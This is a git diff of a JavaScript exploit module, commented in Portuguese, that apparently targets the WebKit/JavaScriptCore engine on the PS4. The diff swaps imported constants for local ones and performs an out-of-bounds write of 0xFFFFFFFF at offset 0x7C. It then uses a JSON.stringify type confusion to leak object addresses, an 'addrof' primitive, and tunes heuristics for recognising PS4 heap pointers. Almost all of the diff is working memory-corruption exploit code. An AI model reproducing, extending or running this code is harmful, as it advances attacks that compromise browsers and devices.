@@ -5,17 +5,15 @@ import { AdvancedInt64, toHex } from '../utils.mjs';
 import {
     triggerOOB_primitive,
     oob_write_absolute,
-    clearOOBEnvironment,
-    HEISENBUG_CRITICAL_WRITE_OFFSET, // Importa o offset crítico do core_exploit
-    HEISENBUG_CRITICAL_WRITE_VALUE // Importa o valor crítico do core_exploit
-} from '../core_exploit.mjs';
+    clearOOBEnvironment
+} from '../core_exploit.mjs'; // REMOVIDA A IMPORTAÇÃO DE HEISENBUG_CRITICAL_WRITE_OFFSET
 
 export const FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO = "OriginalHeisenbug_TypedArrayAddrof_v37_LeakObjectsViaConfusedDetailsObject";
 
 const VICTIM_BUFFER_SIZE = 256;
-// Usaremos as constantes de HEISENBUG_CRITICAL_WRITE_OFFSET e HEISENBUG_CRITICAL_WRITE_VALUE do core_exploit
-// const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C; // Removido, usando o do core_exploit
-// const OOB_WRITE_VALUE = 0xFFFFFFFF; // Removido, usando o do core_exploit
+// RE-ADICIONADAS AS CONSTANTES LOCAIS, pois não podem ser importadas de core_exploit
+const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
+const OOB_WRITE_VALUE = 0xFFFFFFFF;
 
 let object_to_leak_A_v37 = null;
 let object_to_leak_B_v37 = null;
@@ -120,9 +118,9 @@ export async function executeTypedArrayVictimAddrofTest_LeakObjectsViaConfusedDe
     let originalToJSONDescriptor = null;
     try {
         await triggerOOB_primitive({ force_reinit: true });
-        // Usamos as constantes do core_exploit
-        oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET, HEISENBUG_CRITICAL_WRITE_VALUE, 4);
-        logS3(`  Critical OOB write to ${toHex(HEISENBUG_CRITICAL_WRITE_OFFSET)} performed. Value: ${toHex(HEISENBUG_CRITICAL_WRITE_VALUE)}.`, "info", FNAME_CURRENT_TEST);
+        // USANDO AS CONSTANTES LOCAIS NOVAMENTE
+        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
+        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed. Value: ${toHex(OOB_WRITE_VALUE)}.`, "info", FNAME_CURRENT_TEST);
         await PAUSE_S3(100);
 
         victim_typed_array_ref_v37 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
@@ -157,7 +155,7 @@ export async function executeTypedArrayVictimAddrofTest_LeakObjectsViaConfusedDe
                     if (key !== 'payload_A' && key !== 'payload_B') { // Evita serializar os payloads diretamente se forem objetos para evitar ciclos
                         details_of_C1_call_after_modification[key] = first_call_details_object_ref_v37[key];
                     } else {
-                        // Se são os payloads, apenas confirme que existem
+                        // Se são os payloads, apenas confirme que existem e seu tipo
                         details_of_C1_call_after_modification[key + '_exists'] = (first_call_details_object_ref_v37[key] !== undefined);
                         details_of_C1_call_after_modification[key + '_type'] = typeof first_call_details_object_ref_v37[key];
                     }
@@ -166,16 +164,15 @@ export async function executeTypedArrayVictimAddrofTest_LeakObjectsViaConfusedDe
             logS3(`  EXECUTE: Captured state of C1_details object AFTER all probe calls (snapshot): ${details_of_C1_call_after_modification ? JSON.stringify(details_of_C1_call_after_modification) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);
 
             let heisenbugOnC1 = false;
-            // A confirmação da Heisenbug agora é se o C1 (stringifyOutput_parsed) contém os payloads
-            // OU se o snapshot do C1_details original contém as flags de atribuição.
+            // A confirmação da Heisenbug é se o C1 (stringifyOutput_parsed) contém os payloads como números/ponteiros
+            // OU se o snapshot do C1_details original contém as flags de atribuição E a sonda confirmou a TC.
             if (stringifyOutput_parsed && stringifyOutput_parsed.marker_id_v27 === MARKER_P1_V27_PAYLOAD_TEST) {
-                // Verificar se o objeto serializado *conseguiu* manter os payloads como referências ou endereços
                 if ((stringifyOutput_parsed.hasOwnProperty('payload_A') && typeof stringifyOutput_parsed.payload_A === 'number' && stringifyOutput_parsed.payload_A !== 0) ||
                     (stringifyOutput_parsed.hasOwnProperty('payload_B') && typeof stringifyOutput_parsed.payload_B === 'number' && stringifyOutput_parsed.payload_B !== 0)) {
                     heisenbugOnC1 = true;
                 } else if ((stringifyOutput_parsed.payload_A && stringifyOutput_parsed.payload_A.marker_A_v37 === object_to_leak_A_v37.marker_A_v37) ||
                            (stringifyOutput_parsed.payload_B && stringifyOutput_parsed.payload_B.marker_B_v37 === object_to_leak_B_v37.marker_B_v37)) {
-                    heisenbugOnC1 = true; // Se o objeto original foi serializado, mesmo que não seja um ponteiro nu.
+                    heisenbugOnC1 = true; // Objeto original foi serializado diretamente, não seu ponteiro.
                 }
             }
 
@@ -196,13 +193,9 @@ export async function executeTypedArrayVictimAddrofTest_LeakObjectsViaConfusedDe
                 const payload_A_val = stringifyOutput_parsed.payload_A;
                 if (typeof payload_A_val === 'number' && payload_A_val !==0) {
                     let pA_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([payload_A_val]).buffer)[0], new Uint32Array(new Float64Array([payload_A_val]).buffer)[1]);
-                    // A faixa de endereços para ponteiros de objeto geralmente é baixa (0x0000XXXX XXXXXXXX) ou alta (0xFFFFFFFF XXXXXXXX) para objetos na heap.
-                    // Ajuste esta heurística conforme necessário para o ambiente PS4.
-                    // Para PS4, endereços de objetos de heap geralmente começam com 0x8xxxxxxxxx.
-                    // A comparação `pA_int64.high() < 0x00020000` é uma heurística mais geral de JSC/WebKit.
-                    // Para o PS4, o heap pode começar em 0x8000000000000000 ou similar.
-                    // Vamos usar uma verificação mais flexível para o `high()` se for um ponteiro.
-                    if (pA_int64.high() !== 0 || pA_int64.low() > 0x10000) { // Se high não é zero E low não é um número pequeno.
+                    // Heurística para ponteiros de objetos na PS4 (64 bits), que geralmente começam com 0x8xxxxxxxxx
+                    // Ou valores que não sejam pequenos números.
+                    if (pA_int64.high() > 0x70000000 || pA_int64.low() > 0x10000000) { // Ajuste a heurística
                         addrof_A.success = true; addrof_A.msg = `Possible pointer for payload_A in C1_details (stringifyOutput): ${pA_int64.toString(true)}`;
                     } else { addrof_A.msg = `C1.payload_A is number but not ptr pattern: ${payload_A_val} (Raw Float: ${payload_A_val})`; }
                 } else if (payload_A_val && payload_A_val.marker_A_v37 === object_to_leak_A_v37.marker_A_v37) {
@@ -212,7 +205,7 @@ export async function executeTypedArrayVictimAddrofTest_LeakObjectsViaConfusedDe
                 const payload_B_val = stringifyOutput_parsed.payload_B;
                 if (typeof payload_B_val === 'number' && payload_B_val !==0) {
                     let pB_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([payload_B_val]).buffer)[0], new Uint32Array(new Float64Array([payload_B_val]).buffer)[1]);
-                    if (pB_int64.high() !== 0 || pB_int64.low() > 0x10000) { // Mesma heurística
+                    if (pB_int64.high() > 0x70000000 || pB_int64.low() > 0x10000000) { // Mesma heurística
                         addrof_B.success = true; addrof_B.msg = `Possible pointer for payload_B in C1_details (stringifyOutput): ${pB_int64.toString(true)}`;
                     } else { addrof_B.msg = `C1.payload_B is number but not ptr pattern: ${payload_B_val} (Raw Float: ${payload_B_val})`; }
                 } else if (payload_B_val && payload_B_val.marker_B_v37 === object_to_leak_B_v37.marker_B_v37) {
